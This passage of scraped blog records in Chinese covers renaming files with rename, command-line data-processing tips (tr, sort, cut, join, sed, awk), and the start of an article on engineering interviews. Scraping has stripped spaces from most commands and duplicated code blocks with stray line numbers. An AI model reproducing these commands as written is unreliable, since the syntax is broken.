a-very-long-name和一个file-with-a-very-long-name-orig。在Linux上重命名文件重命名文件的传统方法是使用mv命令。该命令将文件移动到不同的目录，或原地更改其名称，或者同时执行这两个操作。$mvmyfile/tmp$mvmyfilenotmyfile$mvmyfile/tmp/notmyfile1234$mvmyfile/tmp$mvmyfilenotmyfile$mvmyfile/tmp/notmyfile但我们也有rename命令来做重命名。使用rename命令的窍门是习惯它的语法，但是如果你了解一些Perl，你可能发现它并不棘手。有个非常有用的例子。假设你想重新命名一个目录中的文件，将所有的大写字母替换为小写字母。一般来说，你在Unix或Linux系统上找不到大量大写字母的文件，但你可以有。这里有一个简单的方法来重命名它们，而不必为它们中的每一个使用mv命令。/A-Z/a-z/告诉rename命令将范围A-Z中的任何字母更改为a-z中的相应字母。$lsAgendaGroup.JPGMyFile$rename'y/A-Z/a-z/'*$lsagendagroup.jpgmyfile123456$lsAgendaGroup.JPGMyFile$rename'y/A-Z/a-z/'*$lsagendagroup.jpgmyfile你也可以使用rename来删除文件扩展名。也许你厌倦了看到带有.txt扩展名的文本文件。简单删除这些扩展名——用一个命令。$lsagenda.txtnotes.txtweekly.txt$rename's/.txt//'*$lsagendanotesweekly123456$lsagenda.txtnotes.txtweekly.txt$rename's/.txt//'*$lsagendanotesweekly现在让我们想象一下，你改变了心意，并希望把这些扩展名改回来。没问题。只需修改命令。窍门是理解第一个斜杠前的s意味着“替代”。前两个斜线之间的内容是我们想要改变的东西，第二个斜线和第三个斜线之间是改变后的东西。所以，$表示文件名的结尾，我们将它改为.txt。$lsagendanotesweekly$rename's/$/.txt/'*$lsagenda.txtnotes.txtweekly.txt123456$lsagendanotesweekly$rename's/$/.txt/'*$lsagenda.txtnotes.txtweekly.txt你也可以更改文件名的其他部分。牢记s/旧内容/新内容/规则。$lsdraft-minutes-2018-03draft-minutes-2018-04draft-minutes-2018-05$rename's/draft/approved/'*minutes*$lsapproved-minutes-2018-03approved-minutes-2018-04approved-minutes-2018-05123456$lsdraft-minutes-2018-03draft-minutes-2018-04draft-minutes-2018-05$rename's/draft/approved/'*minutes*$lsapproved-minutes-2018-03approved-minutes-2018-04approved-minutes-2018-05在上面的例子中注意到，当我们在s/old/new/中使用s时，我们用另一个名称替换名称的一部分。当我们使用y时，我们就是直译（将字符从一个范围替换为另一个范围）。总结现在有很多复制和重命名文件的方法。我希望其中的一些会让你在使用命令行时更愉快。1赞1收藏评论", "url_object_id": "4c1a5cd279328306ee9d94cacae94409"},{"title": "数据科学家的命令行技巧", "url": "http://blog.jobbole.com/114238/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/566b3ec9129f73743155c2f1cc063225.png"], "praise_nums": 4, "fav_nums": 3, "comments_nums": 1, "tags": "2,0,1,8,/,0,7,/,2,7, ,·", "content": "原文出处：kadekillary译文出处：开源中国对于许多数据科学家来说，数据操作起始于Pandas或Tidyverse。从理论上看，这个概念没有错。毕竟，这是为什么这些工具首先存在的原因。然而，对于分隔符转换等简单任务来说，这些选项通常可能是过于重量级了。有意掌握命令行应该在每个开发人员的技能链上，特别是数据科学家。学习shell中的来龙去脉无可否认地会让你更高效。除此之外，命令行还在计算方面有一次伟大的历史记录。例如，awk–一种数据驱动的脚本语言。Awk首次出现于1977年，它是在传奇的K&amp;R一书中的K，BrianKernighan的帮助下出现的。在今天，大约50年之后，awk仍然与每年出现的新书保持相关联！因此，可以肯定的是，对命令行技术的投入不会很快贬值的。我们会谈及的内容ICONVHEADTRWCSPLITSORT&amp;UNIQCUTPASTEJOINGREPSEDAWKICONV文件编码总是棘手的问题。目前大部分文件都是采用的UTF-8编码。要想了解UTF-8的魔力，可以看看这个优秀的视频。尽管如此，有时候我们还是会收到非UTF-8编码的文件。这种情况下就需要尝试转码。iconv就是这种状况下的救世主。iconv是一个简单的程序，可以输入某种编码的文本，然后以另一种编码输出。#Converting-f(from)latin1(ISO-8859-1)#-t(to)standardUTF_8iconv-fISO-8859-1-tUTF-8&lt;input.txt&gt;output.txt1234#Converting-f(from)latin1(ISO-8859-1)#-t(to)standardUTF_8iconv-fISO-8859-1-tUTF-8&lt;input.txt&gt;output.txt常用选项：iconv-l列出所有支持的编码iconv-c不作提示就丢弃无法转换的字符HEAD如果你是重度Pandas的用户，那么你会对head很熟悉。通常在处理新数据时，我们想要做的第一件事就是了解究竟存在那些东西。这会引起Panda启动，读取数据，然后调用df.head()–很费劲，至少可以说。head，不需要任何标志，将输出文件的前10行。head真正的能力在于彻查清除操作。例如，如果我们想将文件的分隔符从逗号改变为pipe通配符。一个快速测试将是：headmydata.csv|sed‘s/,/|/g’#Printsoutfirst10linesheadfilename.csv#Printfirst3lineshead-n3filename.csv1234567#Printsoutfirst10linesheadfilename.csv#Printfirst3lineshead-n3filename.csv有用的选项:head-n输出指定行head-c输出指定的字节TR命令Tr类似于翻译，它是基于文件清理的一个强大使用的工具。一个理想的用法是替换文件中的分隔符。#将文件中的制表符分割转换成逗号cattab_delimited.txt|tr\"\\t\"\",\"comma_delimited.csv12#将文件中的制表符分割转换成逗号cattab_delimited.txt|tr\"\\t\"\",\"comma_delimited.csvTr的另一个特性是在你的处理中设置上所有的[:class:]变量。包括：[:alnum:]所有字母和数字[:alpha:]所有字母[:blank:]所有水平空白[:cntrl:]所有控制字符[:digit:]所有数字[:graph:]所有可打印的字符，不包括空格[:lower:]全部小写字母[:print:]所有可打印的字符，包括空格[:punct:]所有标点符号[:space:]所有的水平或垂直空格[:upper:]全部大写字母[:xdigit:]所有十六进制数字123456789101112[:alnum:]所有字母和数字[:alpha:]所有字母[:blank:]所有水平空白[:cntrl:]所有控制字符[:digit:]所有数字[:graph:]所有可打印的字符，不包括空格[:lower:]全部小写字母[:print:]所有可打印的字符，包括空格[:punct:]所有标点符号[:space:]所有的水平或垂直空格[:upper:]全部大写字母[:xdigit:]所有十六进制数字可以将这些多样化的变量链接在一起，组成一个强大的程序。下面是一个基于字数统计的程序，用来检查你的README文件是否使用过度。catREADME.md|tr\"[:punct:][:space:]\"\"\\n\"|tr\"[:upper:]\"\"[:lower:]\"|grep.|sort|uniq-c|sort-nr1catREADME.md|tr\"[:punct:][:space:]\"\"\\n\"|tr\"[:upper:]\"\"[:lower:]\"|grep.|sort|uniq-c|sort-nr另外一个例子用于正则表达式#将所有的大写字母转换成小写catfilename.csv|tr'[A-Z]''[a-z]'12#将所有的大写字母转换成小写catfilename.csv|tr'[A-Z]''[a-z]'有用的选项：tr-d删除字符tr-s压缩字符\\b退格\\f换页\\v垂直选项卡\\NNN八进制值为NNN的字符WC字数统计。它的价值主要体现在使用-l参数可以进行行数统计。#WillreturnnumberoflinesinCSVwc-lgigantic_comma.csv123#WillreturnnumberoflinesinCSVwc-lgigantic_comma.csv个用这个工具来验证各个命令的输出实在方便。因此，如果我们要在文件中转换分隔符，然后运行wc-l，验证总行数是相同的。如果不同，我们就知道一定是哪里出错了。常用选项：wc-c打印字节数wc-m打印字符数wc-L打印最长一行的长度wc-w打印字数SPLIT命令文件大小可以有显著变化。根据工作的不同，拆分文件是有益的，就像split。基本用法如下：#我们拆分这个CSV文件，每500行分割为一个新的文件new_filenamesplit-l500filename.csvnew_filename_#filename.csv#lsoutput#new_filename_aaa#new_filename_aab#new_filename_aac123456789#我们拆分这个CSV文件，每500行分割为一个新的文件new_filenamesplit-l500filename.csvnew_filename_#filename.csv#lsoutput#new_filename_aaa#new_filename_aab#new_filename_aac两个地方很奇怪：一个是命名方式，一个是缺少扩展名。后缀约定可以通过-d标识来数字化。添加文件扩展名，你需要执行下面这个find命令。他会给当前文件夹下的所有文件追加.csv后缀，所以需要小心使用。find.-typef-execmv'{}''{}'.csv\\;#lsoutput#filename.csv.csv#new_filename_aaa.csv#new_filename_aab.csv#new_filename_aac.csv1234567find.-typef-execmv'{}''{}'.csv\\;#lsoutput#filename.csv.csv#new_filename_aaa.csv#new_filename_aab.csv#new_filename_aac.csv有效的选项：split-b按特定字节大小拆分split-a生成长度为N的后缀split-x使用十六进制后缀分割SORT&amp;UNIQ前面的命令是显而易见的：他们按照自己说的做。这两者提供了最重要的一击（即去重单词计数）。这是由于有uniq，它只处理重复的相邻行。因此在管道输出之前进行排序。一个有趣的事情是，sort-u将获得与sortfile.txt|uniq相同的结果。Sort确实对数据科学家来说是一种很有用的小技巧：能够根据特定的列对整个CSV进行排序。#SortingaCSVfilebythesecondcolumnalphabeticallysort-t\",\"-k2,2filename.csv#Numericallysort-t\",\"-k2n,2filename.csv#Reverseordersort-t\",\"-k2nr,2filename.csv1234567891011#SortingaCSVfilebythesecondcolumnalphabeticallysort-t\",\"-k2,2filename.csv#Numericallysort-t\",\"-k2n,2filename.csv#Reverseordersort-t\",\"-k2nr,2filename.csv这里的-t选项是指定逗号作为分隔符。通常假设是空格或制表符。此外，-k标志是用来指定我们的键的。它的语法是-km,n，m是起始字段，n是最后一个字段。有用的选项:sort-f忽略大小写sort-r逆序sort-R乱序uniq-c计算出现次数uniq-d只打印重复行CUT命令cut用于删除列。举个栗子，如果我们只想要第一列和第三列。cut-d,-f1,3filename.csv1cut-d,-f1,3filename.csv选择除了第一列以外的所有列cut-d,-f2-filename.csv1cut-d,-f2-filename.csv与其他的命令组合使用，cut命令作为过滤器＃打印存在“some_string_value”的第1列和第3列的前10行headfilename.csv|grep\"some_string_value\"|cut-d,-f1,3123＃打印存在“some_string_value”的第1列和第3列的前10行headfilename.csv|grep\"some_string_value\"|cut-d,-f1,3找出第二列中唯一值的数量。catfilename.csv|cut-d,-f2|sort|uniq|wc-l#计算唯一值出现的次数，限制输出前10个结果catfilename.csv|cut-d,-f2|sort|uniq-c|head12345catfilename.csv|cut-d,-f2|sort|uniq|wc-l#计算唯一值出现的次数，限制输出前10个结果catfilename.csv|cut-d,-f2|sort|uniq-c|headPASTEpaste是个有趣的小命令。如果你想合并两个文件，而这两个文件的内容又正好是有序的，那paste就可以这样做。#names.txtadamjohnzach#jobs.txtlawyeryoutuberdeveloper123456789#names.txtadamjohnzach#jobs.txtlawyeryoutuberdeveloper#JointhetwointoaCSVpaste-d','names.txtjobs.txt&gt;person_data.txt123#JointhetwointoaCSVpaste-d','names.txtjobs.txt&gt;person_data.txt#Outputadam,lawyerjohn,youtuberzach,developer1234#Outputadam,lawyerjohn,youtuberzach,developer关于更多SQL_-esque变体，请看下面。JOINJoin是一种简单的、准切向的SQL。最大的区别在于Join将返回所有列，匹配可能只发生在一个字段上。默认情况下，join将尝试使用第一列作为匹配键。对于不同的结果，需要以下语法：#Jointhefirstfile(-1)bythesecondcolumn#andthesecondfile(-2)bythefirstjoin-t\",\"-12-21first_file.txtsecond_file.txt1234#Jointhefirstfile(-1)bythesecondcolumn#andthesecondfile(-2)bythefirstjoin-t\",\"-12-21first_file.txtsecond_file.txt标准连接是一个内部连接。然而，外部连接也可以通过-af滞后来实现。另一个值得注意的是-e标志，如果发现有字段丢失，它可以用来替换成其他值。#Outerjoin,replaceblankswithNULLincolumns1and2#-owhichfieldstosubstitute-0iskey,1.1isfirstcolumn,etc...join-t\",\"-12-a1-a2-e'NULL'-o'0,1.1,2.2'first_file.txtsecond_file.txt1234#Outerjoin,replaceblankswithNULLincolumns1and2#-owhichfieldstosubstitute-0iskey,1.1isfirstcolumn,etc...join-t\",\"-12-a1-a2-e'NULL'-o'0,1.1,2.2'first_file.txtsecond_file.txt虽然它不是最容易使用的命令，但是在绝望的时刻，它就是唯一可用的措施。常用的选项:join-a打印未成对的行join-e替换缺失字段join-j等同于-1FIELD-2FIELDGREP全局搜索正则表达式并输出，或使用grep;可能是最知名的命令，并且有很好的理由。Grep具有很强的能力，特别是在大型代码库中查找方法。在数据科学领域，它充当了其他命令的改进机制。但其标准用法也很有用。#递归搜索并列出当前目录下包含'word'的所有文件grep-lr'word'.#列出包含word的文件数目grep-lr'word'.|wc-l12345#递归搜索并列出当前目录下包含'word'的所有文件grep-lr'word'.#列出包含word的文件数目grep-lr'word'.|wc-l对包含word/pattern的行数进行计数grep-c'some_value'filename.csv#同样的功能，但是按照文件名列出当前目录下所有包含该关键词的文件grep-c'some_value'*12345grep-c'some_value'filename.csv#同样的功能，但是按照文件名列出当前目录下所有包含该关键词的文件grep-c'some_value'*Grep使用or运算符-\\|来检索多个值.grep\"first_value\\|second_value\"filename.csv1grep\"first_value\\|second_value\"filename.csv有用的选项aliasgrep=”grep–color=auto”使grep支持彩色输出grep-E使用扩展正则表达式grep-w仅匹配完整单词grep-l打印匹配文件的名称grep-v倒序匹配大杀器Sed和Awk是本文两个最有用的命令。为了简洁，我不会讨论那些令人费解的细节。相反，我会讨论各种各样的命令来证明他们令人印象深刻的实力。如果你想了解的更多，这本书就可以。SED在内核中sed是一个流编辑器。它擅长替换，但是也可以用来重构。最基本的sed命令包含了s/old/new/g。也就是全局搜索旧值，替换新值。没有/g我们的命令可能在第一次出现旧值就会终止。为了尽快了解它的能力，我们来看一个例子。在这个情况你会拿到下面的文件：balance,name$1,000,john$2,000,jack123balance,name$1,000,john$2,000,jack我们要做的第一件事就是移除美元符。-i标识表示就地修改。”就是代表一个零长度文件扩展，因此重写我们的初始文件。理想情况下，你会单独测试这些并输出到一个新文件。sed-i'''s/\\$//g'data.txt#balance,name#1,000,john#2,000,jack12345sed-i'''s/\\$//g'data.txt#balance,name#1,000,john#2,000,jack下一步，我们的balance列的逗号。sed-i'''s/\\([0-9]\\),\\([0-9]\\)/\\1\\2/g'data.txt#balance,name#1000,john#2000,jack12345sed-i'''s/\\([0-9]\\),\\([0-9]\\)/\\1\\2/g'data.txt#balance,name#1000,john#2000,jack最终，Jack有一天起来并准备辞职了。所以，再见吧，我的朋友。sed-i'''/jack/d'data.txt#balance,name#1000,john1234sed-i'''/jack/d'data.txt#balance,name#1000,john就像你所看到的，sed功能强大，但是乐趣不止于此。AWK最好的放最后。Awk不仅是一个简单的命令：它是一个成熟的语言。在本文中包含的每一个命令中，awk目前是最酷的。如果你发现它令你印象深刻，这有大量的资源-看这，这，和这。awk包含的常用案例：文本处理格式化文本报告执行计算操作执行字符串操作Awk在其最初雏形可以与grep平行。awk'/word/'filename.csv1awk'/word/'filename.csv或者多使用一点魔法，让grep和cut结合。在这，awk对所有行通过word打印了以tab分隔的第三和第四列。-F，只是将分隔符变为逗号。awk-F,'/word/{print$3\"\\t\"$4}'filename.csv1awk-F,'/word/{print$3\"\\t\"$4}'filename.csvAwk具有大量有用的内置变量。例如，NF-字段数–和NR–记录数。为了获取文件中这53个记录：awk-F,'NR==53'filename.csv1awk-F,'NR==53'filename.csv添加一个小窍门可以基于一个值或者多个值过滤。下面的第一个例子，会打印这些记录中第一列为string的行数和列。awk-F,'$1==\"string\"{printNR,$0}'filename.csv#Filterbasedoffofnumericalvalueinsecondcolumnawk-F,'$2==1000{printNR,$0}'filename.csv12345awk-F,'$1==\"string\"{printNR,$0}'filename.csv#Filterbasedoffofnumericalvalueinsecondcolumnawk-F,'$2==1000{printNR,$0}'filename.csv多数值表达式：#Printlinenumberandcolumnswherecolumnthreegreater#than2005andcolumnfivelessthanonethousandawk-F,'$3&gt;=2005&amp;&amp;$5&lt;=1000{printNR,$0}'filename.csv1234#Printlinenumberandcolumnswherecolumnthreegreater#than2005andcolumnfivelessthanonethousandawk-F,'$3&gt;=2005&amp;&amp;$5&lt;=1000{printNR,$0}'filename.csv计算第三列之和：awk-F,'{x+=$3}END{printx}'filename.csv1awk-F,'{x+=$3}END{printx}'filename.csv计算那些第一列值为“something”的第三列之和。awk-F,'$1==\"something\"{x+=$3}END{printx}'filename.csv1awk-F,'$1==\"something\"{x+=$3}END{printx}'filename.csv获取文件的行数列数：awk-F,'END{printNF,NR}'filename.csv#Prettierversionawk-F,'BEGIN{print\"COLUMNS\",\"ROWS\"};END{printNF,NR}'filename.csv12345awk-F,'END{printNF,NR}'filename.csv#Prettierversionawk-F,'BEGIN{print\"COLUMNS\",\"ROWS\"};END{printNF,NR}'filename.csv打印出现过两次的行：awk-F,'++seen[$0]==2'filename.csv1awk-F,'++seen[$0]==2'filename.csv移除多行：#Consecutivelinesawk'a!~$0;{a=$0}']#Nonconsecutivelinesawk'!a[$0]++'filename.csv#Moreefficientawk'!($0ina){a[$0];print}12345678#Consecutivelinesawk'a!~$0;{a=$0}']#Nonconsecutivelinesawk'!a[$0]++'filename.csv#Moreefficientawk'!($0ina){a[$0];print}使用内置函数gsub()替换多个值。awk'{gsub(/scarlet|ruby|puce/,\"red\");print}'1awk'{gsub(/scarlet|ruby|puce/,\"red\");print}'这个awk命令合并了多个CSV文件，忽略头并在结尾追加。awk'FNR==1&amp;&amp;NR!=1{next;}{print}'*.csv&gt;final_file.csv1awk'FNR==1&amp;&amp;NR!=1{next;}{print}'*.csv&gt;final_file.csv需要精简一个大文件？好的，awk可以在sed的帮助下完成这件事。具体来说，基于一个行数，这个命令将一个大文件分为多个小文件。这个一行文件也会添加一个扩展名。sed'1d;$d'filename.csv|awk'NR%NUMBER_OF_LINES==1{x=\"filename-\"++i\".csv\";}{print&gt;x}'#Example:splittingbig_data.csvintodata_(n).csvevery100,000linessed'1d;$d'big_data.csv|awk'NR%100000==1{x=\"data_\"++i\".csv\";}{print&gt;x}'12345sed'1d;$d'filename.csv|awk'NR%NUMBER_OF_LINES==1{x=\"filename-\"++i\".csv\";}{print&gt;x}'#Example:splittingbig_data.csvintodata_(n).csvevery100,000linessed'1d;$d'big_data.csv|awk'NR%100000==1{x=\"data_\"++i\".csv\";}{print&gt;x}'结束前命令行拥有无穷的力量。本文所涵盖的命令行知识足以让你从零基础到入门。除了这些已涉及的内容外，针对日常数据操作还有需要可考虑的实用程序。Csvkit,xsv和q是其中三个值得关注的。如果你希望进一步深入到命令行的数据科学领域，那么请看此书。它也可以在此免费获得！4赞3收藏1评论", "url_object_id": "f94791907923bc49d69ec30bb7c23d25"},{"title": "2 年面试 900 多位工程师后，我总结了这些经验", "url": "http://blog.jobbole.com/114168/", "create_date": "2018-09-13", "front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fstj3g5udqj20gh0b4wi2.jpg"], "praise_nums": 1, "fav_nums": 4, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,0,8, ,·", "content": "本文由伯乐在线-dimple11翻译，刘唱校稿。未经许可，禁止转载！英文出处：AmmonBartram。欢迎加入翻译组。我们在Triplebyte上进行过很多场面试，实际上，我在过去两年内面试的工程师已经达到900余人，这到底算不算卓有成效还真是不好说！（有时我会冒着一身冷汗从梦中惊醒，对这一点充满质疑）。但是不管怎样，我们目标是改进应聘工程师的方式。为此，我们面试时不看求职者的背景，不在乎他们的文凭或简历，只关注他们的编程能力。一个工程师通过了我们这一关后，能直接到我们的合作方公司（包括Apple、Facebook、Dropbox和Stripe）进行终面。我们面试时不知道应聘者的背景，这种情况下看他们是如何在众多顶尖科技公司前大展身手的，我觉得可以给我们的面试提供一些最佳的可用资料。伯乐在线补注：Triplebyte是国外一家专注工程师招聘的网站。在这篇博客中，我要讲讲迄今为止我从这些资料中所学到的东西。技术面试在很多方面都是漏洞百出的，这一点口头说说很简单（而且许多博客都只是这样说说而已！），难的是想出实际的解决方法。我写这篇博客就是为了迎接这个挑战，并为招聘经理和CTO提供一些具体的建议。面试这件事有难度，但我想只要遵循一套缜密的流程，那么许多问题都会迎刃而解。现状大多数的面试过程主要包括两步：简历筛选面试对求职者的筛选就是为了提前淘汰一些求职申请者，节省面试工作的时间。通常筛选过程包括：招聘官大体浏览求职申请者的简历（大概用时10秒以内），然后进行30~60分钟的电话面试。我们的合作方公司中有18%的公司为了考验求职者，也会出编程题让他们回家完成（要么代替电话面试，要么作为电话面试以外的附加题）。有意思的是，绝大多数的求职申请者都是在筛选这一关被拒的。真是这样，我们合作的所有公司中，单纯因为简历就被筛掉的求职申请者已超过了50%，另外有30%因为电话面试/带回家的项目完成不佳而被刷掉。筛选也是聘用过程最变化无常捉摸不定的环节，应聘者太多，导致招聘人员应接不暇，只能做出仓促的决定，因此这时候求职者的文凭资历和专业匹配度就派上了用场。终面几乎普遍都是由一系列45分钟到1小时的会谈组成，每次会谈的面试官都不一样，会谈主要考技术题（每个公司外加一两个针对文化适应和软技能的问题）。招聘经理和每个面试官会在求职申请者离开后，在决策会议上做出他们最终录用/淘汰的决定。在至少有一人力挺，且没人强烈反对的情况下，一个求职申请者才可能被录用。终面除了常见的形式之外，还有各种千变万化的类型。我们合作的公司中，39%会使用白板面试。有52%允许求职者使用他们自己的电脑作答（剩下的9%视情况而定）。有55%让面试官随意提问（剩下的45%采用一套标准面试题）。有40%要考察求职者的CS学术技能后，才能确定去或留。有15%不喜欢CS学术技能（而且觉得探讨计算机科学只能暴露该求职者生产力低）。有80%允许求职申请者在面试时使用任何编程语言（剩下的20%要求他们使用特定编程语言）。有5%会在面试过程中直白地评价求职者编程语言的细节。放眼所有与我们合作的公司，终面后决定录用的占22%。（这个数据是通过询问公司内部招聘渠道获得的。Triplebyte上的求职者通过公司面试被录用的成功率为53%。）其中大概65%会接受offer（达成雇佣关系）。一年后，公司对录用了30%、开除率5%的情况非常满意。漏招VS误招所以，现在的面试存在什么问题呢？毕竟开除员工的频率并非是不可控的。为了更清楚地看待这个问题，我们需要考虑导致面试失败的两种情况：面试了一个不合格的工程师，却将其聘用，过后只好开除（误招）；面试了一个工作能力很强的工程师，却认为他不合格，选择不予聘用（漏招）。误招一眼就能看出来，公司会（在薪水、管理成本和全团队的精神面貌上）付出很大代价，会把一个团队搞得萎靡不振。而与之对比，漏招的损失却看不出来。虽然以上任意一种情况都很有问题，但由于这误招和漏招引发的后果乍一看很不平衡，所以公司的面试很大程度上倾向于不予聘用。面试中存在的干扰会使公司不予聘用的倾向更加严重。在一小时内评估一个人的编程能力本来就是很难的，各种条件经历的匹配、某些直觉感受和以上谈到的公司的复杂喜好等因素掺杂进来，使得你在面试别人时被各种干扰团团围困。为了在受干扰环境下把误招率控制在一个较低的水平，公司在招聘时越来越偏向于不予聘用。这样会错过优秀的工程师，会使文凭的重要程度高过实力，也会由于反复无常，使参与其中的人（面试官和求职者等）感到失望。假使你公司中的每个员工为了争取他们当前的职位都得重新参加面试，那么通过率能有多大呢？这个问题很骇人，几乎可以确定他们不可能都被录取。求职申请人会因为本有能力为公司好好效力却没被录用而神伤，公司也会因为找不到可用之才而遭受损失。要澄清一点，我不是说公司应该降低面试的门槛，相反，面试招人正因为会有拒绝才存在的意义！我更不是说公司对误招的担忧远大过漏招是不对的，招错人要付出高昂代价，我想说的是：各种干扰信号的影响外加之对于误招的防范，会导致面试的漏招率大大攀升，导致人才流失。为解决这一问题，就需要改善面试环境。减少面试中干扰因素的具体方法1.决定你想要招聘哪方面的技术人才一个程序员不可能因为具备了哪一套技能就能被定义为优秀的程序员了，相反，世上的编程技能多得犹如汪洋大海，没有工程师能在所有的领域都游刃有余。实际上，我们在Triplebyte上碰到过一些杰出、成功的软件工程师，他们在几个毫不相关的领域都颇有建树。面试成功的第一步就是决定你想要招聘哪方面的技术人才。我建议你问自己以下几个问题：你想要的程序员是效率高，但写的代码不完善需反复修改的，还是一丝不苟、思维严密的？你想要的程序员是热衷于解决技术难题的还是构建产品的？你想要已经具备某种特定技能的人才还是在工作中有很强的学习能力的？计算机科学学术/数学/算法方面的能力是至关重要的还是无关紧要的？了解并发/C内存模型/HTTP很重要吗？这些问题没有正确答案，我们合作的成功企业对以上每个问题选任一方的都有。但关键是要根据自己的需求有针对性地做出选择，应该避免随便向求职者抛个面试问题了事（或者让每个面试官决定）。这样的话，公司的工程文化就会有一定倾向：淘汰掉越来越多虽然有一技之长但是对公司并没太大用处的、以及不具备公司所需技能（却具备其他重要技能）的工程师。2.问尽可能和实际工作相贴切的问题专业程序员的任务是花数周数月的时间解决大型的、错杂延展的问题，但是面试官并没有数周数月的时间去评估求职申请者的能力，通常每个面试官只有一个小时去考核，所以他们会转而去考察求职申请者在强压下迅速解决小问题的能力。这是两种不同的能力测试。二者有一定的相关性（面试并不完全随机），但并不是完全相关。制定面试问题的一大目标就是减少面试考察和实际工作的差异。方法是在面试时向申请某一职位的求职者（或者为了衡量某一技能）问尽可能相似的问题。比如说，如果你关心后端编程，那就让求职申请者建一个简单的API端点，再添加特性，几乎可以肯定，这比让他们解决一个BFS词链问题有意义得多；如果你关心算法能力，那让求职者在问题中运用算法（比方说，建一个简单的搜索索引，可能使用BST和hashmap，实现提升删除操作的性能），几乎可以肯定，这比让他们确定一点是否包含在一个凹多边形中有意义得多；让求职者在实际编程过程中去尝试调试程序，几乎可以肯定，这比让他们去解决一个白板上的小问题有意义得多。即便如此，面试中要不要让程序员在白板上作答还是有争议的。作为面试官，我不在乎工程师是否记住了Python中的itertools模块，我在乎的是他们是否想通了如何用itertools模块去解决问题。通过让他们在白板上答题，他们便可以不用遵循严格的编程语法，而完全专注于逻辑问题。但最终白板答题的提议还是行不通，因为白板上答案的形式五花八门，没有那么多的评判标准可以对它们一一进行对错评判。所以让求职申请者们回归到电脑上编程，同时告诉他们不必真正去运行代码（或者采用更好的方法，进行开卷面试，让他们在Google上查询任何所需的信息），那么考察他们的目的就已经达到了。面试问题应该对日后工作有所反应，对此要特别警告，面试不依赖于外部因素是至关重要的。比如说，让一个求职者用Ruby编写一个简单的爬虫看似是个很好的实际问题，但是，如果求职者为此需要先安装Nokogiri（一个安装起来非常费劲的Ruby解析库），结果花了30分钟绞尽脑汁应对本地扩展，那么这次面试就糟透了，不仅浪费了时间，而且也让求职者一下子压力爆棚。3.问不会提前泄露的多面性问题另一个针对面试提问的经验之谈是避免提问有可能会“泄露”出去的问题。比如说，有些问题的某些信息可能求职申请者提前能从Glassdoor上读到，所以他们回答起来就会轻而易举，因此这类问题就要避免提问，否则求职者明显就不用动脑筋了，也抹杀了需要考验他们直觉洞察力的地方。而且除此之外，也意味着面试的问题应该由一系列相互承载的部分组成，而不是一个单一的中心。换种有用的方式去想，问问你自己，能不能在面试时帮助一个陷于困境的求职者，并让他在面试结束还能给大家留下一个不错的印象。对答案唯一的问题，如果你给求职申请者提供了明显的帮助，那么他就直接面临淘汰；而对于多面性的问题，你帮了求职申请者一步，那么他还有机会在其余部分大展身手，完美表现。伯乐在线补注：Glassdoor是国外一家做企业点评和职位搜索网站。这一点很重要，不仅因为你的问题会在Glassdoor上泄露出来，而且（更重要的）是因为多面性的问题可以减少干扰。优秀的求职者会背负压力，陷于困境，面试时很重要的一点就是对他们提供帮助，从而让其好好发挥。考查他们解决任意小编程逻辑问题的能力时，他们最近一段时间是不是看到过、或可能只是恰巧碰到过类似的问题，会对考查造成明显干扰，而多面性的问题则可以消除一些干扰，也让求职者们有机会看到他们的努力像滚雪球一样越积越大。给他们提供一步的帮助，往往能帮他们解决紧接着的下一步，这给实际工作提供了重要动力，在面试时把握这一点就可以减少干扰。举例来说，让一个求职者在终端实现“四子连珠”游戏（一系列多个步骤），可能要比让他去旋转矩阵（一个单独步骤，外加之一些小操作）要好得多；让求职者实现k均值聚类（建立在彼此之上的多个操作）可能要比找到直方图中的最大矩形（leetcode的一道算法题）要好得多。4.避免问很难的问题如果求职者很好地解决了一个很难的问题，那能极大地证明他的能力，但也正因为这个问题很难，所以大多数求职者都无力招架。你想要获得的信息量就很大程度上依赖于问题的难度，我们发现面试问题最合适的难度要明显比大多数面试官所想的简单得多。这一点影响更大，因为面试求职者时，获得的信息有两种来源：他们是否对一个问题给出了“正确的”答案、他们得出答案的过程/得出答案的容易程度。我们在Triplebyte上收集了这方面的数据（同时给他们是否得出了正确答案和他们花费了多大努力这两项打分，然后衡量对公司而言哪个分数能更准确地对求职者能力进行预测）。我们发现这是一种权衡，对于更难的问题，求职者是否给出了正确的答案更能说明问题，相比之下，对于更简单的问题，求职者的答题过程和他们花费的努力程度则更有参考价值。考量了这两种信息来源后，面试问题最适宜的难度会往更加简单的方向偏移。我们现在遵循的经验法则是，面试官解决问题所用的时间应该是他们希望求职申请者们解决问题所花时间的25%。所以如果我在为时1小时的面试中提出了一个新的问题，我希望我的同事（没有提醒的情况下）能在15分钟内解答。外加之我们应问实际环境下的多面性问题，这意味着最佳的面试问题真的是相当直白和简单的。要澄清一点，我不是说要降低通过率的门槛。我支持问简单的问题，然后将他们回答的情况纳入考评范围；我支持问简单的问题，然后给予相当严苛的评判。这就是我们所找到的对面试环境进行优化的方式，这种方式额外产生的好处就是可以降低大部分求职者的面试压力。举例来说，让一个求职者创建一个简单的命令行接口，要求存储和检索键值对（如果做得好的话就再增添功能），可能要比让他们为算数表达式实现解析器要好得多；面试问题包含最普通的数据结构（表、哈希、还可能有树）可能要比涉及跳表、二叉排序树或其他更模糊的数据结构要好得多。5向每个求职申请者问相同的问题面试就要对各个求职申请者进行比较，我们的目标就是将他们分为能为公司奉献光与热的和不能奉献的（在大家申请同一职位的情况下，选出申请人中最优秀的一个）。鉴于此，就没有理由向不同的求职申请者问不同的问题。如果你对申请同一职位的不同求职申请者采用不同的方式进行评判，那么你就引入了干扰因素。面试之所以一直都是当场选择问题，我觉得是因为面试官更喜欢这种方式。科技公司的工程师通常不喜欢面试别人，他们只是偶尔面试一下，面试会使他们偏离工作重点。为了将针对每个求职申请者的面试问题规范化，面试官们就需要花费更多的时间去学习如何制定面试问题，并且探讨面试打分、交接的方式。而且每次问题一发生变化，他们就需要重复以上过程。经常问同样的问题只是有些枯燥乏味而已。不幸的是，面试成功唯一的正解就是面试官需要花费心力。保证一致性是实现良好面试的关键所在，也就是说向每个求职申请者问相同的问题，并且要确保交接标准化，除此之外别无他法。6.考虑实行多重的面试方法与我之前的观点相悖，这里我们可以考虑提供几种截然不同的面试方法。筹备面试时，我们首先应该考虑想要招哪种类型的技术人才，但是我们想要的人才特质可能是相矛盾的，这一点很常见，例如想要招非常有数学天分的工程师，和一些高产/重复性强的工程师（甚至可能是针对同